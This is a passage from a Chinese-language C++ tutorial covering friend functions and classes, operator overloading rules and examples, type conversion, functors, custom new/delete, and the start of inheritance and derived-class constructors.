友元的利弊</h4><ul><li>友元不是类成员，但是它可以访问类中的私有成员。友元的作用在于提高程序的运行效率，但是，它破坏了类的封装性和隐藏性，使得非成员函数可以访问类的私有成员。不过，类的访问权限确实在某些应用场合显得有些呆板，从而容忍了友元这一特别语法现象。</li></ul><h4 id="注意事项-2"><a class="markdownIt-Anchor" href="#注意事项-2"></a> 注意事项</h4><ol><li>友元关系不能被继承。</li><li>友元关系是单向的，不具有交换性。若类B是类A的友元，类A不一定是类B的友元，要看在类中是否有相应的声明。</li><li>友元关系不具有传递性。若类B是类A的友元，类C是B的友元，类C不一定是类A的友元，同样要看类中是否有相应的申明</li></ol><h3 id="友元函数"><a class="markdownIt-Anchor" href="#友元函数"></a> 友元函数</h3><ul><li><p>友元函数是可以直接访问类的私有成员的非成员函数。它是定义在类外的普通函数，它不属于任何类，但需要在类的定义中加以声明，声明时只需在友元的名称前加上关键字friend：<code>friend 类型 函数名(形式参数);</code>,一个函数可以是多个类的友元函数，只需要在各个类中分别声明。</p></li><li><p>全局函数作友元函数</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Point(<span class="keyword">double</span> xx, <span class="keyword">double</span> yy)&#123; x = xx;y = yy;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">friend</span> <span class="keyword">double</span> <span class="title">Distance</span><span class="params">(Point &amp;a, Point &amp;b)</span></span>;  <span class="comment">//友元声明在public、private没有区别</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">double</span> x, y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Distance</span><span class="params">(Point &amp;a, Point &amp;b)</span></span>&#123;</span><br><span class="line">  <span class="keyword">double</span> dx = a.x - b.x;<span class="keyword">double</span> dy = a.y - b.y;<span class="keyword">return</span> <span class="built_in">sqrt</span>(dx*dx + dy*dy);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line">Point p1(3.0, 4.0), p2(6.0, 8.0);</span><br><span class="line"><span class="keyword">double</span> d = Distance(p1, p2);</span><br></pre></td></tr></table></figure><ul><li>类成员函数作友元函数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>;</span>    <span class="comment">// 前向声明类Point，否则ManagerPoint声明时无法编译通过</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ManagerPoint</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">double</span> <span class="title">Distance</span><span class="params">(Point &amp;a, Point &amp;b)</span></span>;   <span class="comment">// 能有实现体，否则编译时无法获取Point的结构，造成编译失败不</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Point(<span class="keyword">double</span> xx, <span class="keyword">double</span> yy)&#123; x = xx;y = yy;&#125;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">double</span> <span class="title">ManagerPoint::Distance</span><span class="params">(Point &amp;a, Point &amp;b)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">double</span> x, y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ManagerPoint::Distance</span><span class="params">(Point &amp;a, Point &amp;b)</span></span>&#123; <span class="comment">// 实现体在Point实现之后</span></span><br><span class="line"><span class="keyword">double</span> dx = a.x - b.x;<span class="keyword">double</span> dy = a.y - b.y;<span class="keyword">return</span> <span class="built_in">sqrt</span>(dx*dx + dy*dy);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//------------------------------</span></span><br><span class="line">Point p1(3.0, 4.0), p2(6.0, 8.0);</span><br><span class="line">ManagerPoint mp;</span><br><span class="line"><span class="keyword">float</span> d = mp.Distance(p1,p2);</span><br></pre></td></tr></table></figure><ul><li>前向声明，是一种不完全型（forward declaration）声明，即只需提供类名(无需提供类实现)即可。正因为是（incomplete type）功能也很有限:<ol><li>不能定义类的对象。</li><li>可以用于定义指向这个类型的指针或引用。</li><li>用于声明(不是定义)，使用该类型作为形参类型或者函数的返回值类型。</li></ol></li></ul><h3 id="友元类"><a class="markdownIt-Anchor" href="#友元类"></a> 友元类</h3><ul><li>友元类的所有成员函数都是另一个类的友元函数，都可以访问另一个类中的隐藏信息（包括私有成员和保护成员）。</li><li>当希望一个类可以存取另一个类的私有成员时，可以将该类声明为另一类的友元类。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Test</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">int</span> x ,y;</span><br><span class="line">  <span class="keyword">friend</span> Class B;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Test</span><span class="params">()</span></span>&#123; A a;<span class="built_in">printf</span>(<span class="string">&quot;x=%d,y=%d&quot;</span>.a.x,a.y);&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运算符重载operator-overload"><a class="markdownIt-Anchor" href="#运算符重载operator-overload"></a> 运算符重载(Operator OverLoad)</h2><ul><li>运算符重载的本质是函数重载。</li></ul><h3 id="语法格式"><a class="markdownIt-Anchor" href="#语法格式"></a> 语法格式</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">返值类型 <span class="keyword">operator</span> 运算符名称(形参表列) &#123;</span><br><span class="line">重载实体; &#125;</span><br></pre></td></tr></table></figure><ul><li>operator 运算符名称 在一起构成了新的函数名。</li><li>比如<code>const Complex operator+(const Complex &amp;c1,const Complex &amp;c2);</code>我们会说，operator+ 重载了重载了运算符+。</li></ul><h3 id="友元重载和成员重载"><a class="markdownIt-Anchor" href="#友元重载和成员重载"></a> 友元重载和成员重载</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span>&#123;</span></span><br><span class="line">  <span class="keyword">friend</span> <span class="keyword">const</span> Complex <span class="keyword">operator</span>+(<span class="keyword">const</span> Complex &amp;c1,<span class="keyword">const</span> Complex &amp;c2);</span><br><span class="line">  <span class="keyword">const</span> Complex <span class="keyword">operator</span>+(<span class="keyword">const</span> Complex &amp;another);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">float</span> _x;<span class="keyword">float</span> _y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> Complex <span class="keyword">operator</span>+(<span class="keyword">const</span> Complex &amp;c1,<span class="keyword">const</span> Complex &amp;c2)&#123;</span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;友元函数重载&quot;</span>&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">return</span> Complex(c1._x + c2._x,c1._y + c2._y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> Complex Complex::<span class="keyword">operator</span>+(<span class="keyword">const</span> Complex &amp; another)&#123;</span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;成员函数重载&quot;</span>&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">return</span> Complex(<span class="keyword">this</span>-&gt;_x + another._x,<span class="keyword">this</span>-&gt;_y + another._y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>重载运算符不能破坏语意。</li><li>关于返回值</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">3</span>;<span class="keyword">int</span> b = <span class="number">4</span>;</span><br><span class="line">(a+b) = <span class="number">100</span>; 这种语法是错的，所以重载函数+的返回值加<span class="keyword">const</span>来修饰，防止匿名的返回值被赋值。</span><br><span class="line"><span class="built_in">string</span> a = “china”,b = “ is china”, c;</span><br><span class="line">(c = a) = b; 此时的语法，是重载= 返回值不需加 <span class="keyword">const</span> 。</span><br></pre></td></tr></table></figure><h3 id="重载规则-2"><a class="markdownIt-Anchor" href="#重载规则-2"></a> 重载规则</h3><ul><li><p>1、<code>C++</code>不允许用户自己定义新的运算符，只能对已有的 <code>C++</code>运算符进行重载。</p><ul><li>例如，有人觉得 BASIC 中用<code>**</code>作为幂运算符很方便，也想在 <code>C++</code>中将<code>**</code>定义为幂运算符，用<code>3**5</code>表示3^5，这是不行的</li></ul></li><li><p>2、<code>C++</code>中绝大部分运算符都是可以被重载的<br /><img src="/images/pasted-51.png" alt="可以被重载的运算符" /></p><ul><li>不能重载的运算符只有 4 个,前两个运算符不能重载是为了保证访问成员的功能不能被改变，域运算符合sizeof运算符的运算对象是类型而不是变量或一般表达式，不具备重载的特征。</li></ul></li></ul><table><thead><tr><th>不可重载</th><th>运算符</th></tr></thead><tbody><tr><td><code>.</code></td><td>成员运算符</td></tr><tr><td><code>.*</code></td><td>成员对象选择符</td></tr><tr><td><code>::</code></td><td>域解析运算符</td></tr><tr><td><code>?:</code></td><td>条件运算符，三目运算符</td></tr><tr><td><code>sizeof</code></td><td>类型大小运算符</td></tr></tbody></table><ul><li>只能重载为成员函数的运算符</li></ul><table><thead><tr><th>不可重载</th><th>运算符</th></tr></thead><tbody><tr><td><code>=</code></td><td>赋值运算符</td></tr><tr><td><code>[]</code></td><td>下标运算符</td></tr><tr><td><code>()</code></td><td>函数运算符</td></tr><tr><td><code>-&gt;</code></td><td>间接成员访问</td></tr><tr><td><code>-&gt;*</code></td><td>间接取值访问</td></tr></tbody></table><ul><li>3、重载不能改变运算符运算对象（即操作数）的个数。<ul><li>如关系运算符“&gt;”和“&lt;”等是双目运算符，重载后仍为双目运算符，需要两个参数。运算符<code>+</code>，<code>-</code>，<code>*</code>，<code>&amp;</code>等既可以作为单目运算符，也可以作为双目运算符，可以分别将它们重载为单目运算符或双目运算符。</li></ul></li><li>4、重载不能改变运算符的优先级别。<ul><li>例如<code>*</code>和<code>/</code>优先级高于<code>+</code>和<code>-</code>，不论怎样进行重载，各运算符之间的优先级不会改变。有时在程序中希望改变某运算符的优先级，也只能使用加括号的方法强制改变重载运算符的运算顺序。</li></ul></li><li>5、重载不能改变运算符的结合性。<ul><li>如复制运算符”=“是右结合性（自右至左），重载后仍为右结合性。</li></ul></li><li>6、重载运算符的函数不能有默认的参数<ul><li>否则就改变了运算符参数的个数，与前面第3点矛盾。</li></ul></li><li>7、重载运算符的运算中至少有一个操作数是自定义类。<ul><li>重载的运算符必须和用户定义的自定义类型的对象一起使用，其参数至少应有一个是类对象（或类对象的引用）。也就是说，参数不能全部是 C++的标准类型，以防止用户修改用于标准类型数据成员的运算符的性质，如下面这样是不对的：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">operator</span> + (<span class="keyword">int</span> a,<span class="keyword">int</span> b)&#123;<span class="keyword">return</span>(a-b);&#125;</span><br></pre></td></tr></table></figure><ul><li>原来运算符+的作用是对两个数相加，现在企图通过重载使它的作用改为两个数相减。如果允许这样重载的话，如果有表达式 4+3，它的结果是 7 还是 1 呢？显然，这是绝对要禁止的。</li></ul></li><li>8、不必重载的运算符（= &amp;）<ul><li>用于类对象的运算符一般必须重载，但有两个例外，运算符”=“和运算符”&amp;“不必用户重载。</li><li>复制运算符”=“可以用于每一个类对象，可以用它在同类对象之间相互赋值。因为系统已为每一个新声明的类重载了一个赋值运算符，它的作用是逐个复制类中的数据成员</li><li>地址运算符&amp;也不必重载，它能返回类对象在内存中的起始地址。</li></ul></li><li>9、对运算符的重载，不应该失去其原有的意义<ul><li>应当使重载运算符的功能类似于该运算符作用于标准类型数据时候时所实现的功能。</li><li>例如，我们会去重载”+“以实现对象的相加，而不会去重载”+“以实现对象相减的功能，因为这样不符合我们对”+“原来的认知。</li></ul></li></ul><h3 id="双目运算符重载"><a class="markdownIt-Anchor" href="#双目运算符重载"></a> 双目运算符重载</h3><ul><li>形式：<code>L#R</code></li><li>全局函数：<code>operator#(L,R);</code></li><li>成员函数：<code>L.operator#(R)</code></li><li>实现重载+=</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Complex&amp; <span class="keyword">operator</span>+=(<span class="keyword">const</span> Complex &amp;c)&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;_x += c._x;<span class="keyword">this</span>-&gt;_y += c._y;<span class="keyword">return</span> * <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">float</span> _x;</span><br><span class="line">  <span class="keyword">float</span> _y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="单目运算符重载"><a class="markdownIt-Anchor" href="#单目运算符重载"></a> 单目运算符重载</h3><ul><li>形式：<code>#M 或 M#</code></li><li>全局函数：<code>operator#(M)</code></li><li>成员函数：<code>M.operator#()</code></li><li>重载-运算符</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">const</span> Complex <span class="keyword">operator</span>-(<span class="keyword">void</span>) <span class="keyword">const</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Complex(-_x,-_y);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">float</span> _x;</span><br><span class="line">  <span class="keyword">float</span> _y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="重载格式"><a class="markdownIt-Anchor" href="#重载格式"></a> 重载格式</h3><p><img src="/images/pasted-52.png" alt="重载与函数调用的关系" /></p><ul><li>建议</li></ul><table><thead><tr><th>运算符</th><th>建议使用</th></tr></thead><tbody><tr><td>所有的一元运算符</td><td>成员</td></tr><tr><td><code>+=</code> <code>-=</code> <code>/=</code> <code>*=</code> <code>^=</code> <code>&amp;=</code> <code>!=</code> <code>%=</code> <code>&gt;&gt;=</code> <code>&lt;&lt;=</code></td><td>成员</td></tr><tr><td>其它二员运算符</td><td>非成员</td></tr></tbody></table><ul><li>友元还是成员<ol><li>一个操作符的左右操作数不一定是相同类型的对象，这就涉及到将该操作符函数定义为谁的友元，谁的成员问题。</li><li>一个操作符函数，被声明为哪个类的成员，取决于该函数的调用对象(通常是左操作数)。</li></ol></li></ul><h3 id="使用重载完成类型转换"><a class="markdownIt-Anchor" href="#使用重载完成类型转换"></a> 使用重载完成类型转换</h3><h4 id="标准类型间转换"><a class="markdownIt-Anchor" href="#标准类型间转换"></a> 标准类型间转换</h4><ul><li>隐式类型转换：<code>5/8 5.0/8</code></li><li>显式类型转换：<code>static_cast&lt;float&gt;(5)/8</code>或者<code>(float)5/8</code></li></ul><h4 id="用类型转换构造函数进行类型转换"><a class="markdownIt-Anchor" href="#用类型转换构造函数进行类型转换"></a> 用类型转换构造函数进行类型转换</h4><ul><li>实现其它类型到本类类型的转化。可用于构造和传参（也是构造，赋值）。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 目标类&#123;</span></span><br><span class="line">目标类(<span class="keyword">const</span> 源类 &amp; 源类对象引用) &#123;</span><br><span class="line">  根据需求完成从源类型到目标类型的转换</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>转换构造函数，本质是一个构造函数。是只有一个参数的构造函数。如有多个参数，只能称为构造函数，而不是转换函数。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point3D</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Point3D(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> z):_x(x),_y(y),_z(z)&#123;&#125;</span><br><span class="line">  Point3D(Point2D &amp;p)&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;_x = p._x;<span class="keyword">this</span>-&gt;_y = p._y;<span class="keyword">this</span>-&gt;_z = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">int</span> _x;<span class="keyword">int</span> _y;<span class="keyword">int</span> _z;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>explicit 关键字：以显式的方式完成转化 static_cast&lt;目标类&gt; (源类对象)，否则会报错。</li><li>implicit 关键字：以隐式的方式完成转化</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">explicit</span> <span class="title">Point3D</span><span class="params">(Point2D &amp;p)</span> <span class="comment">//注:explicit 是个仅用于声明的关键字&#123;</span></span></span><br><span class="line">this-&gt;_x = p._x;this-&gt;_y = p._y;this-&gt;_z = 0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Point2D <span class="title">p2</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span></span>;</span><br><span class="line">Point3D p3a = <span class="keyword">static_cast</span>&lt;Point3D&gt; (p2); <span class="comment">//(Point3D)p2;</span></span><br></pre></td></tr></table></figure><h4 id="用类型转换操作符函数进行转换"><a class="markdownIt-Anchor" href="#用类型转换操作符函数进行转换"></a> 用类型转换操作符函数进行转换</h4><ul><li>类型转化函数：转换函数必须是类方法，转换函数无参数，无返回。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 源类&#123;</span></span><br><span class="line"><span class="keyword">operator</span> 转化目标类(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">根据需求完成从源类型到目标类型的转换</span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><ul><li>举例</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point2D</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">operator</span> <span class="title">Point3D</span><span class="params">()</span></span>;  <span class="comment">//无参数，无返回</span></span><br><span class="line"><span class="keyword">private</span>:<span class="keyword">int</span> _x;<span class="keyword">int</span> _y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">Point2D::<span class="keyword">operator</span> <span class="title">Point3D</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Point3D(_x,_y,<span class="number">0</span>);  <span class="comment">//无参数，无返回，但需要return目标类</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-------------------------</span></span><br><span class="line">Point3D p3a = p2;</span><br><span class="line">p3a.dis();</span><br></pre></td></tr></table></figure><h3 id="重载的高级用法"><a class="markdownIt-Anchor" href="#重载的高级用法"></a> 重载的高级用法</h3><h4 id="函数操作符仿函数"><a class="markdownIt-Anchor" href="#函数操作符仿函数"></a> 函数操作符<code>()</code>—仿函数</h4><ul><li>把类对象像函数名一样使用。仿函数(functor)，就是使一个类的使用看上去象一个函数。其实现就是类中实现一个operator()，这个类就有了类似函数的行为，就是一个仿函数类了。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class 类名&#123;</span><br><span class="line">返值类型 operator()(参数类型)</span><br><span class="line">函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>举例</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pow</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;<span class="keyword">return</span> i*i;&#125;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">operator</span> <span class="params">()</span><span class="params">(<span class="keyword">double</span> d)</span></span>&#123;<span class="keyword">return</span> d*d;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//--------------</span></span><br><span class="line">Pow <span class="built_in">pow</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="built_in">pow</span>(<span class="number">4</span>); <span class="comment">//pow.opreator()(4);</span></span><br><span class="line"><span class="keyword">double</span> d = <span class="built_in">pow</span>(<span class="number">5.5</span>);</span><br></pre></td></tr></table></figure><h4 id="堆内存操作符-new-delete"><a class="markdownIt-Anchor" href="#堆内存操作符-new-delete"></a> 堆内存操作符 （new delete）</h4><ul><li>适用于极个别情况需要定制的时候才用的到。注: operator new 中 size_t 参数是编译器自动计算传递的。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="keyword">size_t</span>);</span><br><span class="line"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="keyword">delete</span>[](<span class="keyword">void</span> *);</span><br></pre></td></tr></table></figure><ul><li>全局重载</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="keyword">operator</span> <span class="title">new</span> <span class="params">(<span class="keyword">size_t</span> size)</span></span>&#123;<span class="keyword">return</span> <span class="built_in">malloc</span>(size);&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *p)</span></span>&#123;<span class="built_in">free</span>(p);&#125;</span><br><span class="line"><span class="keyword">void</span> * <span class="keyword">operator</span> <span class="keyword">new</span>[] (<span class="keyword">size_t</span> size)&#123;<span class="keyword">return</span> <span class="built_in">malloc</span>(size);&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="keyword">delete</span>[](<span class="keyword">void</span> *p)&#123;<span class="built_in">free</span>(p);&#125;</span><br></pre></td></tr></table></figure><ul><li>类中重载</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> * <span class="keyword">operator</span> <span class="title">new</span> <span class="params">(<span class="keyword">size_t</span> size)</span></span>&#123;<span class="keyword">void</span> *p = <span class="built_in">malloc</span>(size); <span class="comment">// ((A*)p)-&gt;a = 100;return p;&#125;</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *p)</span></span>&#123;<span class="built_in">free</span>(p);&#125;</span><br><span class="line">  <span class="keyword">void</span> * <span class="keyword">operator</span> <span class="keyword">new</span>[] (<span class="keyword">size_t</span> size)&#123;<span class="keyword">return</span> <span class="built_in">malloc</span>(size);&#125;</span><br><span class="line">  <span class="keyword">void</span> <span class="keyword">operator</span> <span class="keyword">delete</span>[](<span class="keyword">void</span> *p)&#123;<span class="built_in">free</span>(p);&#125;</span><br><span class="line"><span class="keyword">private</span>:<span class="keyword">int</span> a;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="解引用与智能指针-"><a class="markdownIt-Anchor" href="#解引用与智能指针-"></a> 解引用与智能指针（<code>-&gt;</code> /<code>*</code>）</h4><ul><li>常规意义上讲，new 或是 malloc 出来的堆上的空间，都需要手动 delete 和 free 的。但在其它高级语言中，只需申请无需释放的功能是存在的。</li><li>智能指针，被auto_ptr托管以后，不需要关心delete问题，他会在ptr离开其栈空间的时候发生。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  A()&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;A()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">  ~A()&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;~A()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;hahaha&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="function"><span class="built_in">auto_ptr</span>&lt;A&gt; <span class="title">p</span> <span class="params">(<span class="keyword">new</span> A)</span></span>;</span><br><span class="line">p-&gt;func(); <span class="comment">//两种访问方式</span></span><br><span class="line">(*p).func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用重载实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  PMA(A *p):_p(p)&#123;&#125;</span><br><span class="line">  ~PMA()&#123;<span class="keyword">delete</span> _p;&#125;</span><br><span class="line">  A&amp; <span class="keyword">operator</span>*()&#123;<span class="keyword">return</span> *_p;&#125;</span><br><span class="line">  A* <span class="keyword">operator</span>-&gt;()&#123;<span class="keyword">return</span> _p;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  A * _p;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="继承与派生inheritderive"><a class="markdownIt-Anchor" href="#继承与派生inheritderive"></a> 继承与派生(Inherit&amp;&amp;Derive)</h2><ul><li>继承和派生实际描述的是一件事，只不过被描述对象不同，父类派生出子类，子类继承于父类。基类派生出派生类，派生类继承于基类。</li></ul><h3 id="语法-2"><a class="markdownIt-Anchor" href="#语法-2"></a> 语法</h3><ul><li>一个派生类可以同时有多个基类，这种情况称为多重继承，派生类只有一个基类，称为单继承。</li><li>默认继承方式是private</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 派生类名：[继承方式] 基类名&#123;</span></span><br><span class="line">  派生类成员声明；</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="派生类的组成"><a class="markdownIt-Anchor" href="#派生类的组成"></a> 派生类的组成</h3><ul><li>派生类中的成员，包含两大部分，一类是从基类继承过来的，一类是自己增加的成员。从基类继承过过来的表现其共性，而新增的成员体现了其个性。<ol><li>全盘接收，除了构造器与析构器。基类有可能会造成派生类的成员冗余，所以说基类是需设计的。</li><li>派生类有了自己的个性，使派生类有了意义。</li></ol></li></ul><h3 id="派生类的构造"><a class="markdownIt-Anchor" href="#派生类的构造"></a> 派生类的构造</h3><ul><li>派生类中由基类继承而来的成员的初始化工作还是由基类的构造函数完成，然后派生类中新增的成员在派生类的构造函数中初始化</li></ul><h4 id="语法-3"><a class="markdownIt-Anchor" href="#语法-3"></a> 语法</h4><ul><li>构造函数的初始化顺序是根据声明的顺序初始化。</li><li>如果基类中没有默认构造函数(无参)，那么在派生类的构造函数中必须显示调用基类构造函数，以初始化基类成员。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">派生类名::派生类名（参数总表）：基类名（参数表）,内嵌子对象（参数表）&#123;</span><br><span class="line">  派生类新增成员的初始化语句; <span class="comment">//也可出现地参数列表中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果父类没有空参构造函数或者默认值构造函数，那么子类必须要使用参数列表的方式，显是的调用父类的构造器，否则无法完成父类的初始化。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-----------父类-------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Student(<span class="built_in">string</span> sn,<span class="keyword">int</span> n,<span class="keyword">char</span> s):name(sn),num(n),sex(s)&#123;&#125;;</span><br><span class="line">  ~Student();</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">dis</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="built_in">string</span> name;<span class="keyword">int</span> num;<span class="keyword">char</span> sex;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//-----------子类-------------</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graduate</span>:</span><span class="keyword">public</span> Student</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Graduate(<span class="built_in">string</span> sn,<span 